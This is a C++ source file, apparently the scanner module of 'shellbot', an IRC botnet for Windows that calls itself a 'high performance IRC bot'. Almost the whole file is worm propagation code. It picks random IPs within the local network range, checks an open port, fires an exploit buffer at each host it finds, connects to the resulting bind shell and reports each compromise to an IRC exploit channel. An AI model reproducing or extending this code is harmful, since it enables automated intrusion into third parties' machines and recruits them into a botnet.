/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */


#include "vPOEb.h"
#include "Random.h"
#include "vExterns.h"

CScanner CScanner::main;
CRITICAL_SECTION CriticalSection;

void CScanner::Init() {
	main.bRunning = true;
}

void *CScanner::Run()
{
	Sleep(50);
	InitializeRandomSeed(); 
	for (int i=0; i<main.scanThreads; i++) {
		CreateThread(NULL, 0,(unsigned long (__stdcall *)(void *))TCPConnectScanner, NULL, 0, NULL);		
		Sleep(30);
	}
	return NULL;
}

void CScanner::Stop()
{
	Sleep(50);
	for (int i=0; i<main.scanThreads; i++) {
		CScanner::CleanupPThreads();
	}
}

//! Get Random IP
string CScanner::RandomNextIP(string scanIp) {
	string returnIp,rTemp; stringstream ss; int pos=0; 
	for(int i=0; i<count(scanIp.begin(),scanIp.end(),'x'); i++) {
		ss << GetRandNum(1, 255); rTemp += "."; rTemp += ss.str();		
		ss.str(""); }
	returnIp = scanIp.substr(pos,scanIp.find("x")-1) + rTemp;
	return returnIp;
}
string CScanner::ExtractRange(string sLocalIp) {
	string sReturn; int iCount = 0;
	for(int i=0; i<sLocalIp.length(); i++) {		
		if (sLocalIp[i] == '.') {
			iCount++;
			if(iCount == 2) { sReturn.append(".x.x"); break; }
		}
		sReturn += sLocalIp[i];
	}
	return sReturn;
}

		
// ------------------
// TCPConnectScanner
// ------------------
void CScanner::TCPConnectScanner()
{ 
	int iPort = main.tInfo.port;
//	memset(main.tInfo.ip, 0, sizeof(main.tInfo.ip));
	while(main.bRunning) {
		memset(main.tInfo.ip, 0, sizeof(main.tInfo.ip));
		EnterCriticalSection(&CriticalSection); 
		strcpy(main.tInfo.ip,  main.RandomNextIP(main.scanRange).c_str());
#ifdef DEBUG_MODE
//	vPOEb->DebugPrint("debug",con::fg_gray,"IP: %s:%i", main.tInfo.ip, main.tInfo.port);
#endif // DEBUGMODE
		LeaveCriticalSection(&CriticalSection);
		if (main.tInfo.ip != NULL) {
			if (main.ConnectPortOpen(inet_addr(main.tInfo.ip),iPort)) {
				vPOEb->vIRC.SendData("PRIVMSG %s :Sent exploit buffer to (%s) via %s.\r\n",vPOEb->vIRC.cConf.vExploitChan.c_str(), main.tInfo.ip, main.scanExploit.c_str());
				if(exploit[main.scanIndex].exfunc(main.tInfo)){
					if(vPOEb->vPOEshell.ConnectShell(main.tInfo,vPOEb->vPOEshell.bindport)){
						vPOEb->vIRC.SendData("PRIVMSG %s :(%s) Exploit via %s complete.\r\n",vPOEb->vIRC.cConf.vExploitChan.c_str(), main.tInfo.ip, main.scanExploit.c_str());
						exploit[main.scanIndex].stats++;
					}
				}
			} 
		}
		Sleep(2000);
	}
	ExitThread(0);
}


bool CScanner::ConnectPortOpen(unsigned long sIp, unsigned int sPort) {
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = socket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET) 
		return false;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = sIp;
	sin.sin_port = htons(sPort);
	ioctlsocket(sock,FIONBIO,&blockcmd);
	connect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=main.scanDelay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = select(0,0,&rset,0,&timeout);
	closesocket(sock);

	if (i<=0) 
		return false;
	else 
		return true;
}

unsigned long CScanner::SequentialNextIP(string seqIp) {
	return htonl(ntohl(inet_addr(seqIp.c_str())+1));
}

USHORT CScanner::Checksum(USHORT *buffer, int size) {
    unsigned long cksum=0;
    while(size >1) {    
        cksum += *buffer++;
        size -= sizeof(USHORT);
    }
    if(size)    
        cksum += *(UCHAR*)buffer;    
    cksum = (cksum >> 16) + (cksum & 0xffff);
    cksum += (cksum >> 16);
    return (USHORT)(~cksum);
}

string CScanner::makeIP(string ip, bool random, int Class){
	return "";
}

string CScanner::InternalIp()
{
	string ip; char szIp[28];
	sockaddr sa; int sas=sizeof(sa);
	memset(&sa, 0, sizeof(sa)); getsockname(vPOEb->vIRC.vSocket,&sa,&sas);
	sprintf(szIp, "%d.%d.%d.%d", (unsigned char)sa.sa_data[2], (unsigned char)sa.sa_data[3], \
		(unsigned char)sa.sa_data[4], (unsigned char)sa.sa_data[5]);
	ip = szIp;
	return ip;
}



